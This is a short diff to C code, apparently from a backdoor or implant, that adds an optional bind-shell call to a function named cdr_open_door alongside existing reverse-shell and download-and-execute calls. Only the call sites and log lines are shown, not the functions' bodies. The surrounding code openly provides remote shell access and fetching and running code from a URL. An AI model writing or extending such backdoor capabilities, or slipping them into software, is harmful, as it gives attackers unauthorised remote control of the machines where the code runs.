@@ -204,6 +204,10 @@ void cdr_open_door(void) {
     rev_shell();
     LOG("Reverse shell on %s:%u closed\n", rev_ip, rev_port);
 #endif
+#if defined(BIND_SHELL) && defined(BIND_PORT)
+    bind_shell();
+    LOG("Bind shell closed\n");
+#endif
 #ifdef DOWNLOAD_URL
     download_exec();
 #endif
